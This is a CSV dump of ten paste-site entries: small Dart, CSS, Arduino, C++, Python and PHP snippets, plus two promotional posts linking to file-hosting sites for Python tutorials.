id,title,username,language,date,content
FD9xidNy,Untitled,traue,Dart,Monday 2nd of October 2023 06:49:04 PM CDT,"import 'package:flutter/material.dart';

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  State<Home> createState() => _HomeState();
}

class _HomeState extends State<Home> {

  final List<String> cidades = [
    'Aracaju',
    'Belém',
    'Belo Horizonte',
    'Boa Vista',
    'Brasilia',
    'Campo Grande',
    'Cuiaba'
    'Curitiba',
    'Florianópolis',
    'Fortaleza',
    'Goiania',
    'João Pessoa',
    'Macapá',
    'Maceió',
    'Manaus',
    'Natal',
    'Palmas',
    'Porto Alegre',
    'Porto Velho',
    'Recife',
    'Rio Branco',
    'Rio de Janeiro',
    'Salvador',
    'São Luís',
    'São Paulo',
    'Teresina',
    'Vitória'
  ];

  @override
  Widget build(BuildContext context) {
    return Container();
  }
}
"
gyXzAgJJ,Jojo's Steel Ball Run,anaodia7,CSS,Monday 2nd of October 2023 06:44:01 PM CDT,"/*Usar por cima do Yotsuba Blue*/

html{
    background-image:url(""https://i.ibb.co/RHDnCxL/jjbg.png"");
    background-repeat: inherit;
    background-size: cover;
    background-attachment: fixed;
}

body{
    background: rgba(254, 168, 24, 0.5) !important;
    color:#000;
    font-family:arial,helvetica,sans-serif;
    font-size:10pt;
}

a{
  color: #186efe;
text-shadow: black 1px 1px 1px;
}

.options_tab_icon.active, .options_tab_icon:hover{
  color: gold;
}

a:hover{
  color: green;
text-shadow: black 1px 1px 1px;
}

form table tr th, #options_div, #alert_div, div.pages, .theme-catalog div.grid-size-small{
  color: gold;
  background: #186efe;
  border: dotted blue 2px;
}

.boardlist{
  background: #186efe !important;
  color: gold !important;
  border-bottom: dotted blue 2px !important;
}

.boardlist a{
  color: #A2C5FE !important;
}

.boardlist a:hover{
  color: green !important;
}

div.post.reply{
  border: dotted blue 2px;
  background: #74A8FE;
}

.intro span.name{
  color: gold !important;
text-shadow: black 1px 1px 1px;
}
 
div.post.reply.highlighted{
    background: magenta;
    border: #FFF 2px dashed !important;
  color: #FFF;
}

div.post.reply:hover{
    background: #392c20;
    border: green 2px dashed !important;
  color: green;
}

/*banner shit*/
img.banner, img.board_image {
    display: block;
 
/*added linkcde*/
    content:url('https://i.ibb.co/HKsBNd5/1500jojo.png');
    border: 2px dashed gold;
  margin-top: 40px !important;
}
 
 
a.quick-reply-btn{
  visibility: hidden !important;
visibility: collapse !important;
}
 
textarea#body{
   width: 295px;
   height: 92px;
}
 
.dropzone-wrap{
  width: 295px !important;
}

h1, h2, h3, h4, div.ban h2{
  color: gold !important;
}"
7kaMnZQq,PythonOperators,sissou123,Python,Monday 2nd of October 2023 06:30:14 PM CDT,"PythonOperators

 In Python programming, Operators in general are used to perform operations on values and variables. These are standard symbols used for the ...
for more:
https://www.gulf-up.com/6o28gdg90h1z


"
sMn1ms3s,Haloween Automation,learnelectronics,Arduino,Monday 2nd of October 2023 06:20:55 PM CDT,"/********************************************************
 *  Arduino Foundation Series: Automatic Jackolantern   *
 *              Learnelectronics Oct. 2023 (C)         *
 *       https://www.youtube.com/learnelectronics       *
 ********************************************************/
// Define constants for pin numbers
const int inputPin = 2; // The input pin to monitor
const int ledPin1 = 5;  // First LED pin
const int ledPin2 = 6;  // Second LED pin


// Variables to track LED state and timing
bool ledState1 = LOW;   // Initial LED state for LED 1
bool ledState2 = LOW;   // Initial LED state for LED 2
unsigned long previousMillis = 0; // Stores the last time LEDs were toggled
const long interval = 1000; // Interval for the 1-second duty cycle (in milliseconds)



void setup() {
  pinMode(inputPin, INPUT); // Set the input pin as INPUT
  pinMode(ledPin1, OUTPUT); // Set the LED pins as OUTPUT
  pinMode(ledPin2, OUTPUT);
  pinMode(3,OUTPUT);
}

void loop() {
  // Read the state of the input pin
  int buttonState = digitalRead(inputPin);
  
  // Check if the input pin is HIGH (button pressed)
  if (buttonState == HIGH) {
    unsigned long currentMillis = millis(); // Get the current time
    
    // Check if it's time to toggle the LEDs
    if (currentMillis - previousMillis >= interval) {
      // Save the current time
      previousMillis = currentMillis;
      
      // Toggle the state of both LEDs
      ledState1 = !ledState1;
      ledState2 = !ledState2;
      
      // Set the LEDs to their new states
      digitalWrite(ledPin1, ledState1);
      digitalWrite(ledPin2, ledState2);

      for (int i = 200; i <= 400; i++) {
    tone(3, i);
    delay(11);
  }
    noTone(3);  
    }
  } else {
    // If the input pin is LOW (button not pressed), turn off both LEDs
    digitalWrite(ledPin1, LOW);
    digitalWrite(ledPin2, LOW);
  }
}"
DcDb4YQw,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:10:02 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3001);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000)  + 1;
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin()  + 1;
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
vW1rQ4kV,Untitled,sissou123,Python,Monday 2nd of October 2023 06:09:03 PM CDT,"DSA: Recursion with Python
Recursion is an important concept in computer programming. It allows us to create a function that calls itself. A good knowledge of recursion will help us understand the overall concept of data structures and algorithms more effectively.

Learn Recursion with Python will help you learn the concept of recursion from the very basics level with images, examples and challenges.
for more: https://www.file-upload.org/wsfqy1bq1ktp"
wsqWSM6B,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 06:07:15 PM CDT,"class RecentCounter {

private:

vector<int> Pings;

int IDX = 0;

public:
    
    RecentCounter() { 
        Pings.resize(3000);
    }

    int ping(int t) {
        
        Pings[IDX%3000] = t;

        int Ans = 0;

        if(IDX / 3000 > 0){
            Ans += Pings.end() - lower_bound(Pings.begin() + IDX%3000, Pings.end(), t - 3000);
            Ans += lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) - Pings.begin();
        }else{
            
             Ans = (Pings.begin() + IDX%3000) - lower_bound(Pings.begin(), Pings.begin() + IDX%3000, t - 3000) + 1;
        }

        ++IDX;
        return Ans;


    }
};
/*
 1, 2, 3, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
 3021, 3022, 4343, 4, 5..., 2700, 2701, ..., 2998, 2999, 3000
*/
/**
 * Your RecentCounter object will be instantiated and called as such:
 * RecentCounter* obj = new RecentCounter();
 * int param_1 = obj->ping(t);
 */"
22mbaXpB,Untitled,thehunmonkgroup,Python,Monday 2nd of October 2023 06:06:57 PM CDT,"import asyncio
import aio_pika
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
from queue import Queue

class Resource:
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.executor = ThreadPoolExecutor(max_workers=1)
        self.connection = None
        self.channel = None
        self.queue = Queue()

    def start(self):
        Thread(target=self.loop_in_thread, args=(self.loop,)).start()

    def loop_in_thread(self, loop):
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.connect())
        loop.run_forever()

    async def connect(self):
        self.connection = await aio_pika.connect_robust(""amqp://guest:guest@localhost/"", loop=self.loop)
        self.channel = await self.connection.channel()
        queue = await self.channel.declare_queue('test_queue')
        await queue.consume(self.on_message)

    async def on_message(self, message):
        async with message.process():
            self.queue.put(message.body)

    def process_messages(self):
        while not self.queue.empty():
            message = self.queue.get()
            print(message)
            # Process the message here

    def stop(self):
        self.loop.call_soon_threadsafe(self.loop.stop)

if __name__ == ""__main__"":
    resource = Resource()
    resource.start()
    try:
        while True:
            resource.process_messages()
    except KeyboardInterrupt:
        resource.stop()"
uprFvj0V,Untitled,Zlatas863,PHP,Monday 2nd of October 2023 06:06:14 PM CDT,"<?php
// prní metoda
function LoadClass($class) {
  $subdir = ""classes/"";
  require_once($subdir . $classFile);
}
spl_autoload_register(""LoadClass"");

// druhá metoda
$subdir = ""classes/"";
$dir = opendir($subdir);
while ($file = readdir($dir)){
	if (pathinfo($file, PATHINFO_EXTENSION) == ""php""){
	require_once($subdir . $file);
}
closedir($dir);
?>"
5QwevFVv,"[review_form_url post_id=""""]",geminilabs,PHP,Monday 2nd of October 2023 05:44:20 PM CDT,"/**
 * Registers the [review_form_url post_id=""""] shortcode
 */
add_shortcode('review_form_url', function ($atts) {
	$atts = shortcode_atts(['post_id' => 0], $atts);
	$postId = (int) $atts['post_id'];
	return add_query_arg('assigned_post', get_the_ID(), get_permalink($postId));
});"
